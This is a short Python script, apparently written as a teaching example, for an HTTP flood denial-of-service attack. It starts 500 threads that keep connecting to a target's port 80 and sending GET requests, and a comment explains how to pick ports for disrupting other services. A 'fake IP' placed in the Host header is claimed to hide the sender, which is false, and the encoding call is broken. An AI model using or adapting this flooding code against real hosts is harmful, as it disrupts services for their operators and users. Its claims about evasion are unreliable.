"""
This is not an actual DDOS attack script
It's just a basic script to understand the fundamentals of DDOS attack.
This is nowhere near powerful enough, 
Firstly because this is too slow
Python doesn't actually support multi threading - just simulates it
And this script's got a LOT of security loopholes...

Even if you manage to write a solid script from this,
DDOS-ing IPs is a serious crime.
You're on your own. I am not responsible for any malpractice...
"""
import threading
import socket

target = '<target ip address/domain name>'

"""
Depending on the particular service you're trying to disrupt
you must select a different port...

For example,

Port 20 -- File transfer protocol Data Transfer
Port 21 -- File Transfer protocol Command control
Port 22 -- Secure Shell (SSH)
Port 23 -- Telnet - Remote Login Service
Port 25 -- Simle Mail Transfer Protocol E-mail routing
Port 53 -- Domain Name System (DNS) service
Port 80 -- Hypertext Transfer Protocol (HTTP) used in World Wide Web
Port 143 -- Internet Message Access Protocol (IMAP)
Port 443 -- HTTP Secure (HTTPS) HTTP over TLS/SSL

This script however, only aims to disrupt the HTTP services
of a particular IP so we will use Port 80
"""
port = 80

# Just specifying a fake ip in case someone comes snooping around...
fake_ip = '182.21.20.32'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))

        s.sendto(("GET /"+ target +"HTTP/1.1\r\n").encode(ascii), (target, port))
        s.sendto(("Host: "+ fake_ip +"\r\n\r\n").encode(ascii), (target, port))
        s.close()

# Now running this function in multiple threads
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
